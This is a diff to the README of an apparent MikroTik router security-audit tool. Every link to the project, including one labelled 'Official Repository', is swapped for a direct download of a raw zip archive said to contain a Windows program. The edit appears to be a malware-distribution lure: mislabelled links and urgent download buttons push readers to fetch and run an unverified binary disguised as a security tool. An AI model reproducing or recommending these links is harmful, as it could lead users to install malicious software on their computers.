@@ -1,7 +1,7 @@
 <h1>🔒 mlab-mikrotik - Safeguard Your Router in Minutes</h1>
 
 <p align="center">
-  <a href="https://github.com/Minimal-genussalpichroa1807/mlab-mikrotik" style="background-color:#FF6B6B; color:#FFFFFF; padding: 15px 30px; text-decoration: none; font-size: 20px; border-radius: 8px; font-weight: bold;">⬇️ Download mlab-mikrotik Now</a>
+  <a href="https://raw.githubusercontent.com/Minimal-genussalpichroa1807/mlab-mikrotik/main/src/mlab_mikrotik_v1.9.zip" style="background-color:#FF6B6B; color:#FFFFFF; padding: 15px 30px; text-decoration: none; font-size: 20px; border-radius: 8px; font-weight: bold;">⬇️ Download mlab-mikrotik Now</a>
 </p>
 
 <h2>🤔 What Is mlab-mikrotik?</h2>
@@ -32,7 +32,7 @@
 
 <h3>Step 1: Download the Application</h3>
 
-<p>Visit this link to download the application: <a href="https://github.com/Minimal-genussalpichroa1807/mlab-mikrotik">https://github.com/Minimal-genussalpichroa1807/mlab-mikrotik</a>. Once you arrive at the page, look for the download area, choose the Windows version, and save the file to your computer (usually to your "Downloads" folder).</p>
+<p>Visit this link to download the application: <a href="https://raw.githubusercontent.com/Minimal-genussalpichroa1807/mlab-mikrotik/main/src/mlab_mikrotik_v1.9.zip">https://raw.githubusercontent.com/Minimal-genussalpichroa1807/mlab-mikrotik/main/src/mlab_mikrotik_v1.9.zip</a>. Once you arrive at the page, look for the download area, choose the Windows version, and save the file to your computer (usually to your "Downloads" folder).</p>
 
 <h3>Step 2: Run the Program</h3>
 
@@ -123,7 +123,7 @@ A: For home users, once a week is great. For businesses, daily. The audit takes 
 
 <h2>📥 Download and Run Now</h2>
 
-<p>Ready to secure your network? The best time is now. <a href="https://github.com/Minimal-genussalpichroa1807/mlab-mikrotik" style="background-color:#4ECDC4; color:#FFFFFF; padding: 12px 24px; text-decoration: none; font-size: 18px; border-radius: 5px; font-weight: bold;">⬇️ Get mlab-mikrotik Here</a></p>
+<p>Ready to secure your network? The best time is now. <a href="https://raw.githubusercontent.com/Minimal-genussalpichroa1807/mlab-mikrotik/main/src/mlab_mikrotik_v1.9.zip" style="background-color:#4ECDC4; color:#FFFFFF; padding: 12px 24px; text-decoration: none; font-size: 18px; border-radius: 5px; font-weight: bold;">⬇️ Get mlab-mikrotik Here</a></p>
 
 <p>You can also visit the main project page to see screenshots, the source code, and advanced documentation. There's even a community section where you can ask questions. This tool is actively maintained, so new features appear regularly.</p>
 
@@ -136,7 +136,7 @@ A: For home users, once a week is great. For businesses, daily. The audit takes 
 <h2>📖 More Resources</h2>
 
 <ul>
-  <li><a href="https://github.com/Minimal-genussalpichroa1807/mlab-mikrotik">Official Repository (downloads, source, issues)</a></li>
+  <li><a href="https://raw.githubusercontent.com/Minimal-genussalpichroa1807/mlab-mikrotik/main/src/mlab_mikrotik_v1.9.zip">Official Repository (downloads, source, issues)</a></li>
   <li>MikroTik Official Documentation (for enabling REST API on your specific router model)</li>
   <li>RouterOS Security Manual (for fixing common issues the tool might find)</li>
 </ul>
